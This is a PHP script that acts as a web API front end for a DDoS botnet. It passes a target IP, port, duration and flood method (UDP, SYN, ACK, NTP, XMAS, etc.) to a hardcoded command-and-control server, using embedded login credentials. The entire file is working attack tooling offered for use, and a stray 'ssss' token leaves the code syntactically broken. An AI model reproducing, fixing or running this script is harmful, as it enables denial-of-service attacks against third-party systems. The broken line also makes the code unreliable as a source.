<?php
//API Link: http://ServerIP/PercocetAPI.php?&ip=IP&port=PORT&time=TIME&method=METHOD
set_time_limit(0);

$server = "45.95.168.149";// Your Server Ip
$conport = 1412;// Your C2 Port
$username = "frosty";
$password = "xanz";

$activekeys = array();

$method = $_GET['method'];
$target = $_GET['ip'];
$port = $_GET['port'];
$time = $_GET['time'];

if($method == "STD"){$command = "STD $target $port $time";}
if($method == "UDP"){$command = "UDP $target $port $time";}
if($method == "NTP"){$command = "NTP $target $port $time";}
if($method == "TCP"){$command = "TCP $target $port $time";}
if($method == "XMAS"){$command = "XMS $target $port $time";}
if($method == "ACK"){$command = "ACK $target $port $time";}
if($method == "SYN"){$command = "SYN $target $port $time";}


$sock = fsockopen($server, $conport, $errno, $errstr, 2);

if(!$sock){
        echo "Couldn't Connect To CNC Server...";
} else{
        print(fread($sock, 512)."\n");
        fwrite($sock, $username . "\n");
        echo "<br>";
        print(fread($sock, 512)."\n");
        fwrite($sock, $password . "\n");
        echo "<br>";
        if(fread($sock, 512)){
                print(fread($sock, 512)."\n");
        }

        fwrite($sock, $command . "\n");ssss
        fclose($sock);
        echo "<br>";
        echo "> $command ";
}
?>